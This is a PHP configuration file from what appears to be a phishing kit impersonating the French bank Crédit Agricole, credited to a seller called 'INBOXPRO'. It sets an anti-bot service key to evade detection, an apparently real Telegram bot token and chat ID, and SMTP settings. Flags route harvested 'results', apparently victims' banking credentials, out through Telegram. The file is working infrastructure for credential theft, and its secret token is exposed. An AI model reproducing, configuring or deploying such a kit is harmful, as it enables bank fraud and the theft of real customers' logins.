<?php

/**
 * @link       : https://www.maxi-terrestre.com/ 
 * @package    : CREDIT AGRICOLE
 * @author     : INBOXPRO 
 * @telegram   : @inboxpro
 * @email      : maxiterrestre@gmail.com
 * @facebook   : https://www.facebook.com/maxi.terrestre
 */
    
    session_start();
    error_reporting(0);

    define("ANTIBOT_API", 'API_HERE'); /* ANTIBOT.PW API */
    define("CPANEL_MODE", 0); /* CPANEL MODE : 0 or 1 */
  

    define("TELEGRAM_TOKEN", '6368781290:AAE_3qyyGDRYBqa25as0FKOEqDLSTRNLmsQ'); /* Le token ou API key du bot Télégram */
    define("TELEGRAM_CHAT_ID", '-4044855165'); /* L'identifiant de messagerie du Télégram */
    
    
    define("SMTP_HOSTNAME", 'smtp.host.com'); /* Serveur host du SMTP */
    define("SMTP_USER", 'username'); /* Username du SMTP */
    define("SMTP_PASS", 'password'); /* Password du SMTP */
    define("SMTP_PORT", 465); /* port du SMTP */
    define("SMTP_SSL", ''); /* SSL secure du SMTP : false or true or '' */
    define("SMTP_FROM_EMAIL", 'mail@from.me'); /* Email de l'expediteur du mail */
    define("SMTP_FROM_NAME", 'satan2'); /* Nom de l'expediteur du mail */
    define("RECEIVER_EMAIL", 'your@email.com'); /* Adresse de reception via le SMTP */


    define("RECEIVE_VIA_EMAIL", 0); /* Receive results via e-mail : 0 or 1 */
    define("RECEIVE_VIA_SMTP", 0); /* Receive results via smtp : 0 or 1 */
    define("RECEIVE_VIA_TELEGRAM", 1); /* Receive results via telegram : 0 or 1 */



    require_once 'detect.php';
    require_once 'functions.php';


   
?>